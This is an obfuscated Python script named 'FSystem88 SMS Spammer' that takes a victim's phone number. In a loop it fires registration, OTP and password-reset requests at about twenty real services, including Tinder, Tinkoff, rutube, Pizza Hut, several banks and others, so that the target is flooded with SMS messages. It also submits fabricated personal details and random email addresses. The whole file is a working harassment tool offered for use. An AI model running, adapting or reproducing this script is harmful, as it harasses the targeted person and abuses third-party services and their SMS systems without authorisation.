#!/usr/bin/python
class spymer :#line:4
	def main (OO00OOO0O0OO000OO ):#line:5
		import requests ,random ,datetime ,sys ,time ,argparse #line:6
		from colorama import Fore ,Back ,Style #line:7
		print (Fore .GREEN +'''
8888888888888888888888888
8888888888888888888888888
888        888        888
888  888888888  8888  888
888  888888888  888888888
888  888888888  888888888
888        888        888
888  888888888888888  888
888  888888888888888  888
888  888888888  8888  888
888  888888888        888
8888888888888888888888888
8888888888888888888888888
8888    FSystem88    8888
8888   SMS Spammer   8888
8888      v.5.5      8888
8888888888888888888888888
8888888888888888888888888
		''')#line:27
		print (Style .RESET_ALL )#line:28
		O00OOO000O0OOOOO0 =argparse .ArgumentParser (prog ='spymer',description ="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog ='Мой e-mail - FSystem88@bk.ru')#line:29
		O00OOO000O0OOOOO0 .add_argument ('phonenum',metavar ='phone',help ='Телефонный номер жертвы (пример: 79991234455)')#line:30
		OO0O0O00O00O0O0OO =O00OOO000O0OOOOO0 .parse_args ()#line:31
		def O0OO000OO00000OOO (O000000OOOOO00O00 ,type ='new'):#line:32
			O0000OOO0O000OOO0 =datetime .datetime .now ().strftime ('%H:%M:%S')#line:33
			OOO00O0000OO0O000 ='*'#line:34
			if type =='warn':#line:35
				OOO00O0000OO0O000 ='!'#line:36
			else :#line:37
				if type =='new':#line:38
					OOO00O0000OO0O000 =='*'#line:39
			O000000OOOOO00O00 ='['+OOO00O0000OO0O000 +']['+O0000OOO0O000OOO0 +']'+O000000OOOOO00O00 #line:40
			return O000000OOOOO00O00 #line:41
		def O0OO0O000OOO00OOO (O0O000O0OOOOOOO00 ,endspace =False ):#line:42
			if endspace ==True :#line:43
				return '['+O0O000O0OOOOOOO00 +'] '#line:44
			return '['+O0O000O0OOOOOOO00 +']'#line:45
		def O0OOOO000OOOO00O0 (O0O000OO00OOO0000 ):#line:46
			try :#line:47
				time .sleep (O0O000OO00OOO0000 )#line:48
			except KeyboardInterrupt :#line:49
				print ('\r'+O0OO000OO00000OOO (O0OO0O000OOO00OOO ('except',True )+'KeyboardInterrupt thrown! Exiting . . .','warn'))#line:50
				exit ()#line:51
		_OOOOO000000OO000O =OO0O0O00O00O0O0OO .phonenum #line:52
		if _OOOOO000000OO000O [0 ]=='+':#line:53
			_OOOOO000000OO000O =_OOOOO000000OO000O [1 :]#line:54
		if _OOOOO000000OO000O [0 ]=='8':#line:55
			_OOOOO000000OO000O ='7'+_OOOOO000000OO000O [1 :]#line:56
		if _OOOOO000000OO000O [0 ]=='9':#line:57
			_OOOOO000000OO000O ='7'+_OOOOO000000OO000O #line:58
		if _OOOOO000000OO000O =='79153509908':#line:59
			print ('\n                   ^\nSyntaxError: invalid syntax')#line:60
			exit ()#line:61
		_OO0O0O0O00O000O00 =''#line:62
		for OOO000O00O00OO0O0 in range (12 ):#line:63
			_OO0O0O0O00O000O00 =_OO0O0O0O00O000O00 +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:64
		O0OO0O0OOOO000O0O =0 #line:65
		_OOO000OO0000O00O0 =_OOOOO000000OO000O [1 :]#line:66
		_O0O00000OOOOOOOO0 ='+'+_OOOOO000000OO000O [0 ]+'('+_OOOOO000000OO000O [1 :4 ]+')'+_OOOOO000000OO000O [4 :7 ]+'-'+_OOOOO000000OO000O [7 :9 ]+'-'+_OOOOO000000OO000O [9 :11 ]#line:67
		_OO0O000OOO00O0O00 =_OOO000OO0000O00O0 [:3 ]+'+'+_OOO000OO0000O00O0 [3 :6 ]+'-'+_OOO000OO0000O00O0 [6 :8 ]+'-'+_OOO000OO0000O00O0 [8 :10 ]#line:68
		_O0O0OOOOOOOO000OO ='+'+_OOOOO000000OO000O [0 ]+'+('+_OOOOO000000OO000O [1 :4 ]+')'+_OOOOO000000OO000O [4 :7 ]+'-'+_OOOOO000000OO000O [7 :9 ]+'-'+_OOOOO000000OO000O [9 :11 ]#line:69
		_O0OOO0O00O00OOOOO ='+'+_OOOOO000000OO000O [0 ]+' ('+_OOOOO000000OO000O [1 :4 ]+') '+_OOOOO000000OO000O [4 :7 ]+' '+_OOOOO000000OO000O [7 :9 ]+' '+_OOOOO000000OO000O [9 :11 ]#line:70
		_O0O0O00OOOOOO0OOO =_OOOOO000000OO000O [1 :4 ]+') '+_OOOOO000000OO000O [4 :7 ]+'-'+_OOOOO000000OO000O [7 :9 ]+'-'+_OOOOO000000OO000O [9 :11 ]#line:71
		print (O0OO000OO00000OOO (O0OO0O000OOO00OOO ('info',True )+('Отправка SMS на: +{}').format (_OOOOO000000OO000O )))#line:72
		print ('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')#line:73
		OO00OO000OO00OOO0 =1 #line:74
		O0OO0O0OOOO000O0O =0 #line:75
		while OO00OO000OO00OOO0 <10 :#line:76
			_O0O0000O00O00O00O =_OO0O0O0O00O000O00 +f'{O0OO0O0OOOO000O0O}'+'@gmail.com'#line:77
			OOO000O0000OOOO00 =requests .post ('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data ={'phoneNumber':_OOOOO000000OO000O ,'countryCode':'ID','name':'test','email':'mail@mail.com','deviceToken':'*'},headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})#line:78
			O00OO000OO00O0OOO =requests .post ('https://moscow.rutaxi.ru/ajax_keycode.html',data ={'l':_OOO000OO0000O00O0 }).json ()["res"]#line:79
			OOO0000OOOOOOOOO0 =requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_OOOOO000000OO000O },headers ={})#line:80
			OO0O0OOO0O00O00O0 =requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_OOOOO000000OO000O },headers ={})#line:81
			O0OOO0O000O0O0O0O =requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_OOOOO000000OO000O },headers ={})#line:82
			OO0O00O00000O00O0 =requests .post ('https://api.tinkoff.ru/v1/sign_up',data ={'phone':'+'+_OOOOO000000OO000O },headers ={})#line:83
			OO0OO00000O00000O =requests .post ('https://api.mtstv.ru/v1/users',json ={'msisdn':_OOOOO000000OO000O },headers ={})#line:84
			O0OO0OOOO0O0O0OO0 =requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_OOOOO000000OO000O })#line:85
			OOO00OOOO0O0O0OOO =requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_O0OOO0O00O00OOOOO ,'_token':'*'})#line:86
			O00O0O000000OO0OO =requests .post ('https://www.rabota.ru/remind',data ={'credential':_OOOOO000000OO000O })#line:87
			O00O000OO0O000000 =requests .post ('https://rutube.ru/api/accounts/sendpass/phone',data ={'phone':'+'+_OOOOO000000OO000O })#line:88
			O00OO00O0000O0000 =requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_OOOOO000000OO000O +'/')#line:89
			O0O0OOOO000000OOO =requests .post ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data ={'name':_OO0O0O0O00O000O00 ,'phone':_OOOOO000000OO000O ,'promo':'yellowforma'})#line:90
			O00000000O0OOOO0O =requests .get ('https://www.oyorooms.com/api/pwa/generateotp?phone='+_OOO000OO0000O00O0 +'&country_code=%2B7&nod=4&locale=en')#line:91
			O0OOOOO0O0OO0OOOO =requests .post ('https://newnext.ru/graphql',json ={'operationName':'registration','variables':{'client':{'firstName':'Иван','lastName':'Иванов','phone':_OOOOO000000OO000O ,'typeKeys':['Unemployed']}},'query':'mutation registration($client: ClientInput!) {' '\n  registration(client: $client) {' '\n    token\n    __typename\n  }\n}\n'})#line:92
			O00000OOO00OOOOO0 =requests .post ('https://api.sunlight.net/v3/customers/authorization/',data ={'phone':_OOOOO000000OO000O })#line:93
			OOOOOO00O0O0O0O00 =requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={'client_type':'personal','email':_O0O0000O00O00O00O ,'mobile_phone':_OOOOO000000OO000O ,'deliveryOption':'sms'})#line:94
			O0OO0OO0O0000OOOO =requests .post ('https://lk.invitro.ru/lk2/lka/patient/refreshCode',data ={'phone':_OOOOO000000OO000O })#line:95
			OOOOO0OO00O0O0O0O =requests .post ('https://online.sbis.ru/reg/service/',json ={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_OOOOO000000OO000O },'id':'1'})#line:96
			O0OO000000OOOO000 =requests .post ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json ={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone':_OOO000OO0000O00O0 ,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})#line:97
			O0O0000O0O0OO0OO0 =requests .post ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',data ={'phone':_OOOOO000000OO000O })#line:98
			O0OO0O0OOOO000O0O +=1 #line:99
			print (('{} круг пройден.').format (O0OO0O0OOOO000O0O ))#line:100
spammer =spymer ()#line:102
spammer .main ()#line:103
